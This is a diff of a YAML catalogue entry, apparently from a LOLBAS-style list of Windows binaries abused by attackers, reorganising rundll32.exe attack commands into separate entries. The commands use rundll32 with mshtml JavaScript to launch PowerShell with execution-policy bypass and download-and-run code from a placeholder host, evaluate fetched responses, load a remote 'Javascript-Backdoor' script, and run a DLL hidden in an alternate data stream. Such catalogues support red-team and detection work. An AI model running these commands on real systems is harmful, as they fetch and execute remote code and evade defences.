@@ -7,16 +7,15 @@ Categories: []
 Commands:
   - Command: rundll32.exe AllTheThingsx64,EntryPoint
     Description: ''
-  - Command: "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"\
-      WScript.Shell\").Run(\"powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');\"\
-      \n\nrundll32.exe javascript:\"\\..\\mshtml.dll,RunHTMLApplication \";eval(\"\
-      w=new%20ActiveXObject(\\\"WScript.Shell\\\");w.run(\\\"calc\\\");window.close()\"\
-      );\n\nrundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%20ActiveXObject(\"\
-      WScript.Shell\").run(\"calc.exe\",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(\"\
-      WScript.Shell\").Run(\"cmd /c taskkill /f /im rundll32.exe\",0,true);}\n\nrundll32.exe\
-      \ javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"\
-      script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test\"\
-      )\n\nrundll32 \"C:\\ads\\file.txt:ADSDLL.dll\",DllMain"
+  - Command: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');"
+    Description: ''
+  - Command: rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new%20ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
+    Description: ''
+  - Command: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}
+    Description: ''
+  - Command: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test")
+    Description: ''
+  - Command: rundll32 "C:\ads\file.txt:ADSDLL.dll",DllMain
     Description: ''
 Full Path:
   - C:\Windows\System32\rundll32.exe
